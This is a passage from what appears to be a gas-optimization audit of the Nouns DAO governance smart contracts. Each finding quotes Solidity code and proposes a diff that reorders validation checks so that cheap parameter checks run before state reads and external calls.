a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -141,10 +141,6 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         uint256 proposalThresholdBPS_,\n         DynamicQuorumParams calldata dynamicQuorumParams_\n     ) public virtual {\n-        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');\n-        if (msg.sender != admin) {\n-            revert AdminOnly();\n-        }\n         require(timelock_ != address(0), 'NounsDAO::initialize: invalid timelock address');\n         require(nouns_ != address(0), 'NounsDAO::initialize: invalid nouns address');\n         require(\n@@ -159,6 +155,10 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n             proposalThresholdBPS_ >= MIN_PROPOSAL_THRESHOLD_BPS && proposalThresholdBPS_ <= MAX_PROPOSAL_THRESHOLD_BPS,\n             'NounsDAO::initialize: invalid proposal threshold bps'\n         );\n+        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');\n+        if (msg.sender != admin) {\n+            revert AdminOnly();\n+        }\n\n```\n\n### External calls + state reads are very expensive. Validate local/functional parameters first\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L204-L221\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n204:        ProposalTemp memory temp;\n\n206:        temp.totalSupply = nouns.totalSupply();\n\n208:        temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);\n\n210:        require(\n211:            nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,\n212:            'NounsDAO::propose: proposer votes below proposal threshold'\n213:        );\n214:        require(\n215:            targets.length == values.length &&\n216:                targets.length == signatures.length &&\n217:                targets.length == calldatas.length,\n218:            'NounsDAO::propose: proposal function information arity mismatch'\n219:        );\n220:        require(targets.length != 0, 'NounsDAO::propose: must provide actions');\n221:        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');\n```\n\nIn our function above, we start by making some external function calls `nouns.totalSupply()` and reading from state `proposalThresholdBPS`. We then do some validation for some function parameters. As reading function parameters is cheaper, we should validate them first , so that if they don't pass our check, we can revert early and without too much gas.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..15ecc0c6 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -201,6 +201,15 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         bytes[] memory calldatas,\n         string memory description\n     ) public returns (uint256) {\n+        require(\n+            targets.length == values.length &&\n+                targets.length == signatures.length &&\n+                targets.length == calldatas.length,\n+            'NounsDAO::propose: proposal function information arity mismatch'\n+        );\n+        require(targets.length != 0, 'NounsDAO::propose: must provide actions');\n+        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');\n+\n         ProposalTemp memory temp;\n\n         temp.totalSupply = nouns.totalSupply();\n@@ -211,14 +220,6 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n             nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,\n             'NounsDAO::propose: proposer votes below proposal threshold'\n         );\n-        require(\n-            targets.length == values.length &&\n-                targets.length == signatures.length &&\n-                targets.length == calldatas.length,\n-            'NounsDAO::propose: proposal function information arity mismatch'\n-        );\n-        require(targets.length != 0, 'NounsDAO::propose: must provide actions');\n-        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');\n```\n\n### Validate function parameter first before reading from state\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L615-L617\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n615:    ) internal returns (uint96) {\n616:        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');\n617:        require(support <= 2, 'NounsDAO::castVoteInternal: invalid vote type');\n```\nAs `support` is a function parameter, it would be cheaper to validate it first before reading the state variable `ProposalState`.\n\nIn case of a revert on the check `support <= 2` we would not end up wasting too much gas validating the state variable.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..2c5034df 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -613,8 +613,8 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         uint256 proposalId,\n         uint8 support\n     ) internal returns (uint96) {\n-        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');\n         require(support <= 2, 'NounsDAO::castVoteInternal: invalid vote type');\n+        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');\n```\n\n### Avoid validating state variables before validating function parameters\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L644-L651\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n644:    function _setVotingDelay(uint256 newVotingDelay) external {\n645:        if (msg.sender != admin) {\n646:            revert AdminOnly();\n647:        }\n648:        require(\n649:            newVotingDelay >= MIN_VOTING_DELAY && newVotingDelay <= MAX_VOTING_DELAY,\n650:            'NounsDAO::_setVotingDelay: invalid voting delay'\n651:        );\n```\nIn the above, the second check reads function parameters and constants. The first check reads from state. As it it more gas efficient to read function parameters and constants, we should validate it first.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..52a3bb63 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -642,13 +642,13 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n      * @param newVotingDelay new voting delay, in blocks\n      */\n     function _setVotingDelay(uint256 newVotingDelay) external {\n-        if (msg.sender != admin) {\n-            revert AdminOnly();\n-        }\n         require(\n             newVotingDelay >= MIN_VOTING_DELAY && newVotingDelay <= MAX_VOTING_DELAY,\n             'NounsDAO::_setVotingDelay: invalid voting delay'\n         );\n+        if (msg.sender != admin) {\n+            revert AdminOnly();\n+        }\n```\n\n### Validate function parameters first before reading any state variables\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L663-L669\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n663:        if (msg.sender != admin) {\n664:            revert AdminOnly();\n665:        }\n666:        require(\n667:            newVotingPeriod >= MIN_VOTING_PERIOD && newVotingPeriod <= MAX_VOTING_PERIOD,\n668:            'NounsDAO::_setVotingPeriod: invalid voting period'\n669:        );\n```\nReorder the checks to validate function parameters first as they are cheaper to read compared to state variables.\n\n```diff\n     function _setVotingPeriod(uint256 newVotingPeriod) external {\n-        if (msg.sender != admin) {\n-            revert AdminOnly();\n-        }\n         require(\n             newVotingPeriod >= MIN_VOTING_PERIOD && newVotingPeriod <= MAX_VOTING_PERIOD,\n             'NounsDAO::_setVotingPeriod: invalid voting period'\n         );\n+        if (msg.sender != admin) {\n+            revert AdminOnly();\n+        }\n```\n\n### Validate Function parameter  before validating state variables\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L681-L689\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n681:    function _setProposalThresholdBPS(uint256 newProposalThresholdBPS) external {\n682:        if (msg.sender != admin) {\n683:            revert AdminOnly();\n684:        }\n685:        require(\n686:            newProposalThresholdBPS >= MIN_PROPOSAL_THRESHOLD_BPS &&\n687:                newProposalThresholdBPS <= MAX_PROPOSAL_THRESHOLD_BPS,\n688:            'NounsDAO::_setProposalThreshold: invalid proposal threshold bps'\n689:        );\n```\nIn case of a revert on the function parameter validation, we might save some good amount of gas (SLOAD) that would have been used in reading `admin` which is a state variable.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\nindex ff426a81..2a9aca20 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n@@ -679,14 +679,14 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n      * @param newProposalThresholdBPS new proposal threshold\n      */\n     function _setProposalThresholdBPS(uint256 newProposalThresholdBPS) external {\n-        if (msg.sender != admin) {\n-            revert AdminOnly();\n-        }\n         require(\n             newProposalThresholdBPS >= MIN_PROPOSAL_THRESHOLD_BPS &&\n                 newProposalThresholdBPS <= MAX_PROPOSAL_THRESHOLD_BPS,\n             'NounsDAO::_setProposalThreshold: invalid proposal threshold bps'\n         );\n+        if (msg.sender != admin) {\n+            revert AdminOnly();\n+        }\n```\n\n### Reorder the checks here to have cheaper checks first\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L702-L711\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n702:    function _setMinQuorumVotesBPS(uint16 newMinQuorumVotesBPS) external {\n703:        if (msg.sender != admin) {\n704:            revert AdminOnly();\n705:        }\n706:        DynamicQuorumParams memory params = getDynamicQuorumParamsAt(block.number);\n\n708:        require(\n709:            newMinQuorumVotesBPS >= MIN_QUORUM_VOTES_BPS_LOWER_BOUND &&\n710:                newMinQuorumVotesBPS <= MIN_QUORUM_VOTES_BPS_UPPER_BOUND,\n711:            'NounsDAO::_setMinQuorumVotesBPS: invalid min quorum votes bps'\n```\nWe have a check for function parameters against some constants variables. As this is a cheaper check, it should be done before any other check or any other operations.<br>\nMove the check to the beginning.\n\n```diff\n     function _setMinQuorumVotesBPS(uint16 newMinQuorumVotesBPS) external {\n-        if (msg.sender != admin) {\n-            revert AdminOnly();\n-        }\n-        DynamicQuorumParams memory params = getDynamicQuorumParamsAt(block.number);\n-\n         require(\n             newMinQuorumVotesBPS >= MIN_QUORUM_VOTES_BPS_LOWER_BOUND &&\n                 newMinQuorumVotesBPS <= MIN_QUORUM_VOTES_BPS_UPPER_BOUND,\n             'NounsDAO::_setMinQuorumVotesBPS: invalid min quorum votes bps'\n         );\n+        if (msg.sender != admin) {\n+            revert AdminOnly();\n+        }\n+        DynamicQuorumParams memory params = getDynamicQuorumParamsAt(block.number);\n+\n         require(\n             newMinQuorumVotesBPS <= params.maxQuorumVotesBPS,\n             'NounsDAO::_setMinQuorumVotesBPS: min quorum votes bps greater than max'\n```\n\n### Function parameters should be validated first\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L732-L741\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n732:    function _setMaxQuorumVotesBPS(uint16 newMaxQuorumVotesBPS) external {\n733:        if (msg.sender != admin) {\n734:            revert AdminOnly();\n735:        }\n736:        DynamicQuorumParams memory params = getDynamicQuorumParamsAt(block.number);\n\n738:        require(\n739:            newMaxQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS_UPPER_BOUND,\n740:            'NounsDAO::_setMaxQuorumVotesBPS: invalid max quorum votes bps'\n741:        );\n```\nConsider validating the function parameter `newMaxQuorumVotesBPS` before reading from state . The first check `msg.sender != admin` involves reading a state variable `admin`. Reading from state is expensive. As it is, in case of a revert on the require statement on line 738, the gas consumed reading from state would be wasted.\n\n```diff\n     function _setMaxQuorumVotesBPS(uint16 newMaxQuorumVotesBPS) external {\n+        require(\n+            newMaxQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS_UPPER_BOUND,\n+            'NounsDAO::_setMaxQuorumVotesBPS: invalid max quorum votes bps'\n+        );\n         if (msg.sender != admin) {\n             revert AdminOnly();\n         }\n         DynamicQuorumParams memory params = getDynamicQuorumParamsAt(block.number);\n\n-        require(\n-            newMaxQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS_UPPER_BOUND,\n-            'NounsDAO::_setMaxQuorumVotesBPS: invalid max quorum votes bps'\n-        );\n```\n\n### Validate all function parameters first before reading any state variables\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L783-L802\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol\n783:    function _setDynamicQuorumParams(\n784:        uint16 newMinQuorumVotesBPS,\n785:        uint16 newMaxQuorumVotesBPS,\n786:        uint32 newQuorumCoefficient\n787:    ) public {\n788:        if (msg.sender != admin) {\n789:            revert AdminOnly();\n790:        }\n791:        if (\n792:            newMinQuorumVotesBPS < MIN_QUORUM_VOTES_BPS_LOWER_BOUND ||\n793:            newMinQuorumVotesBPS > MIN_QUORUM_VOTES_BPS_UPPER_BOUND\n794:        ) {\n795:            revert InvalidMinQuorumVotesBPS();\n796:        }\n797:        if (newMaxQuorumVotesBPS > MAX_QUORUM_VOTES_BPS_UPPER_BOUND) {\n798:            revert InvalidMaxQuorumVotesBPS();\n799:        }\n800:        if (newMinQuorumVotesBPS > newMaxQuorumVotesBPS) {\n801:            revert MinQuorumBPSGreaterThanMaxQuorumBPS();\n802:        }\n```\n\n```diff\n@@ -785,9 +785,6 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         uint16 newMaxQuorumVotesBPS,\n         uint32 newQuorumCoefficient\n     ) public {\n-        if (msg.sender != admin) {\n-            revert AdminOnly();\n-        }\n         if (\n             newMinQuorumVotesBPS < MIN_QUORUM_VOTES_BPS_LOWER_BOUND ||\n             newMinQuorumVotesBPS > MIN_QUORUM_VOTES_BPS_UPPER_BOUND\n@@ -800,7 +797,10 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {\n         if (newMinQuorumVotesBPS > newMaxQuorumVotesBPS) {\n             revert MinQuorumBPSGreaterThanMaxQuorumBPS();\n         }\n-\n+        if (msg.sender != admin) {\n+            revert AdminOnly();\n+        }\n+\n```\n\n### Validate function parameters before validating state variables\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol#L78-L80\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOProxy.sol\n78:    function _setImplementation(address implementation_) public {\n79:        require(msg.sender == admin, 'NounsDAOProxy::_setImplementation: admin only');\n80:        require(implementation_ != address(0), 'NounsDAOProxy::_setImplementation: invalid implementation address');\n```\n\nThe first check, `msg.sender == admin` involves reading from state `admin` which is a bit expensive. The second check, however validates that a function parameter `implementation_` != `address(0)`. As the second check is cheaper , it should be done first so that in case it reverts , no gas would be wasted reading from state.\n\n```diff\n     function _setImplementation(address implementation_) public {\n-        require(msg.sender == admin, 'NounsDAOProxy::_setImplementation: admin only');\n         require(implementation_ != address(0), 'NounsDAOProxy::_setImplementation: invalid implementation address');\n-\n+        require(msg.sender == admin, 'NounsDAOProxy::_setImplementation: admin only');\n+\n```\n\n### Function parameters should be checked first before reading any state variables\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L150-L153\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\n150:        if (address(ds.timelock) != address(0)) revert CanOnlyInitializeOnce();\n151:        if (msg.sender != ds.admin) revert AdminOnly();\n152:        if (timelock_ == address(0)) revert InvalidTimelockAddress();\n153:        if (nouns_ == address(0)) revert InvalidNounsAddress();\n```\nThe first two checks involves reading some state variables ie `ds.timelock` and `ds.admin`. The next two simply checks some local variables(function parameters). Reading function parameters is cheaper than state variables and in case of a revert on the function parameter check, we would end up wasting too much gas on reading state. We should reorder the checks to have cheaper checks first.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\nindex 00c5ccdc..fee29faa 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\n@@ -147,10 +147,10 @@ contract NounsDAOLogicV3 is NounsDAOStorageV3, NounsDAOEventsV3 {\n         NounsDAOParams calldata daoParams_,\n         DynamicQuorumParams calldata dynamicQuorumParams_\n     ) public virtual {\n-        if (address(ds.timelock) != address(0)) revert CanOnlyInitializeOnce();\n-        if (msg.sender != ds.admin) revert AdminOnly();\n         if (timelock_ == address(0)) revert InvalidTimelockAddress();\n         if (nouns_ == address(0)) revert InvalidNounsAddress();\n+        if (address(ds.timelock) != address(0)) revert CanOnlyInitializeOnce();\n+        if (msg.sender != ds.admin) revert AdminOnly();\n\n```\n\n### Validate parameters before making external function calls\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L351-L365\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n351:    function _setMinQuorumVotesBPS(NounsDAOStorageV3.StorageV3 storage ds, uint16 newMinQuorumVotesBPS)\n352:        external\n353:        onlyAdmin(ds)\n354:    {\n355:        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);\n\n357:        require(\n358:            newMinQuorumVotesBPS >= MIN_QUORUM_VOTES_BPS_LOWER_BOUND &&\n359:                newMinQuorumVotesBPS <= MIN_QUORUM_VOTES_BPS_UPPER_BOUND,\n360:            'NounsDAO::_setMinQuorumVotesBPS: invalid min quorum votes bps'\n361:        );\n362:        require(\n363:            newMinQuorumVotesBPS <= params.maxQuorumVotesBPS,\n364:            'NounsDAO::_setMinQuorumVotesBPS: min quorum votes bps greater than max'\n365:        );\n```\nWe make an external call `getDynamicQuorumParamsAt(block.number)` then we make some checks  for the function parameters. If the parameters don't meet our requirements, we would end up reverting. In case of a revert, it would mean that the gas spent making the external function call was wasted. We should reorder this checks to validate the parameters first before doing the external calls. This way, a revert on the parameter check would not waste gas doing the external call.\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\nindex 4dcacae8..c2218691 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n@@ -352,13 +352,13 @@ library NounsDAOV3Admin {\n         external\n         onlyAdmin(ds)\n     {\n-        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);\n-\n         require(\n             newMinQuorumVotesBPS >= MIN_QUORUM_VOTES_BPS_LOWER_BOUND &&\n                 newMinQuorumVotesBPS <= MIN_QUORUM_VOTES_BPS_UPPER_BOUND,\n             'NounsDAO::_setMinQuorumVotesBPS: invalid min quorum votes bps'\n         );\n+        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);\n+\n         require(\n             newMinQuorumVotesBPS <= params.maxQuorumVotesBPS,\n             'NounsDAO::_setMinQuorumVotesBPS: min quorum votes bps greater than max'\n```\n\n### Avoid making external calls before validating function parameters\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L381-L390\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol\n381:    function _setMaxQuorumVotesBPS(NounsDAOStorageV3.StorageV3 storage ds, uint16 newMaxQuorumVotesBPS)\n382:        external\n383:        onlyAdmin(ds)\n384:    {\n385:        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);\n\n387:        require(\n388:            newMaxQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS_UPPER_BOUND,\n389:            'NounsDAO::_setMaxQuorumVotesBPS: invalid max quorum votes bps'\n390:        );\n```\nIn the above function, we are making an external `getDynamicQuorumParamsAt(block.number)` then we do some validity checks. In case of a revert when validating the function parameter `newMaxQuorumVotesBPS` the gas used making the external call would be wasted. Perform all validations first before making any external calls.\n\n```diff\n-        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);\n-\n         require(\n             newMaxQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS_UPPER_BOUND,\n             'NounsDAO::_setMaxQuorumVotesBPS: invalid max quorum votes bps'\n         );\n+        NounsDAOStorageV3.DynamicQuorumParams memory params = ds.getDynamicQuorumParamsAt(block.number);\n+\n```\n\n### Validate function parameters before validating state variables\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L176-L178\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n176:        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');\n177:        require(timelock_ != address(0), 'NounsDAO::initialize: invalid timelock address');\n178:        require(nouns_ != address(0), 'NounsDAO::initialize: invalid nouns address');\n```\n\nIf we end up reverting on the checks for function parameters(`timelock_` and `nouns_`) the gas spent reading the state variable `timelock` would be wasted. As SLOAD are quite expensive, it would be wise to first validate the cheaper variables.\n\n```diff\n         __ReentrancyGuard_init_unchained();\n-        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');\n         require(timelock_ != address(0), 'NounsDAO::initialize: invalid timelock address');\n         require(nouns_ != address(0), 'NounsDAO::initialize: invalid nouns address');\n+        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');\n```\n\n### Validate all function parameters first before doing other operations \nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L279-L298\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n279:        checkGovernanceActive();\n\n281:        ProposalTemp memory temp;\n\n283:        temp.totalSupply = adjustedTotalSupply();\n\n285:        temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);\n\n287:        require(\n288:            nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,\n289:            'NounsDAO::propose: proposer votes below proposal threshold'\n290:        );\n291:        require(\n292:            targets.length == values.length &&\n293:                targets.length == signatures.length &&\n294:                targets.length == calldatas.length,\n295:            'NounsDAO::propose: proposal function information arity mismatch'\n296:        );\n297:        require(targets.length != 0, 'NounsDAO::propose: must provide actions');\n298:        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');\n```\n\n```diff\n+        require(\n+            targets.length == values.length &&\n+                targets.length == signatures.length &&\n+                targets.length == calldatas.length,\n+            'NounsDAO::propose: proposal function information arity mismatch'\n+        );\n+        require(targets.length != 0, 'NounsDAO::propose: must provide actions');\n+        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');\n+\n         checkGovernanceActive();\n\n         ProposalTemp memory temp;\n@@ -288,14 +297,6 @@ contract NounsDAOLogicV1Fork is UUPSUpgradeable, ReentrancyGuardUpgradeable, Nou\n             nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,\n             'NounsDAO::propose: proposer votes below proposal threshold'\n         );\n-        require(\n-            targets.length == values.length &&\n-                targets.length == signatures.length &&\n-                targets.length == calldatas.length,\n-            'NounsDAO::propose: proposal function information arity mismatch'\n-        );\n-        require(targets.length != 0, 'NounsDAO::propose: must provide actions');\n-        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');\n```\n\n### Reorder the checks to have the cheaper checks first\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L617-L618\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n617:        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');\n618:        require(support <= 2, 'NounsDAO::castVoteInternal: invalid vote type');\n```\nThe first check involves reading a state variable while the second check just reads a function parameter. To minimize gas consumed in case of a revert on the second check, we should do it first as it's cheaper.\n\n```diff\n-        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');\n         require(support <= 2, 'NounsDAO::castVoteInternal: invalid vote type');\n+        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');\n```\n\n### Validations that involve state reads should not be done at the beginning if we have other cheaper checks\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L646-L650\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n646:        require(msg.sender == admin, 'NounsDAO::_setVotingDelay: admin only');\n647:        require(\n648:            newVotingDelay >= MIN_VOTING_DELAY && newVotingDelay <= MAX_VOTING_DELAY,\n649:            'NounsDAO::_setVotingDelay: invalid voting delay'\n650:        );\n```\nThe second check is cheaper as it just reads a function parameter and a constant variable.\n\n```diff\n     function _setVotingDelay(uint256 newVotingDelay) external {\n-        require(msg.sender == admin, 'NounsDAO::_setVotingDelay: admin only');\n         require(\n             newVotingDelay >= MIN_VOTING_DELAY && newVotingDelay <= MAX_VOTING_DELAY,\n             'NounsDAO::_setVotingDelay: invalid voting delay'\n         );\n+        require(msg.sender == admin, 'NounsDAO::_setVotingDelay: admin only');\n         uint256 oldVotingDelay = votingDelay;\n         votingDelay = newVotingDelay;\n```\n\n### Reorder the checks to have cheaper checks first\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L662-L666\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n662:        require(msg.sender == admin, 'NounsDAO::_setVotingPeriod: admin only');\n663:        require(\n664:            newVotingPeriod >= MIN_VOTING_PERIOD && newVotingPeriod <= MAX_VOTING_PERIOD,\n665:            'NounsDAO::_setVotingPeriod: invalid voting period'\n666:        );\n```\n\n```diff\n     function _setVotingPeriod(uint256 newVotingPeriod) external {\n-        require(msg.sender == admin, 'NounsDAO::_setVotingPeriod: admin only');\n         require(\n             newVotingPeriod >= MIN_VOTING_PERIOD && newVotingPeriod <= MAX_VOTING_PERIOD,\n             'NounsDAO::_setVotingPeriod: invalid voting period'\n         );\n+        require(msg.sender == admin, 'NounsDAO::_setVotingPeriod: admin only');\n         uint256 oldVotingPeriod = votingPeriod;\n         votingPeriod = newVotingPeriod;\n```\n\n### Any variable checks should be done first\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol#L166-L185\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol\n166:    function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external {\n167:        uint256 currentNounId = _currentNounId;\n168:        uint256 maxNounId = 0;\n169:        if (msg.sender != escrow.dao()) revert OnlyOriginalDAO();\n170:        if (block.timestamp >= forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod();\n```\n\nInstead of reading from states and performing some other variable initialization, we should do the if checks first. This way we can revert early and cheaply if our conditions are not met.\n\n```diff\n     function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external {\n-        uint256 currentNounId = _currentNounId;\n-        uint256 maxNounId = 0;\n         if (msg.sender != escrow.dao()) revert OnlyOriginalDAO();\n         if (block.timestamp >= forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod();\n+        uint256 currentNounId = _currentNounId;\n+        uint256 maxNounId = 0;\n\n         for (uint256 i = 0; i < tokenIds.length; i++) {\n             uint256 nounId = tokenIds[i];\n```\n\n### Reorder the checks here to avoid wasting gas on later 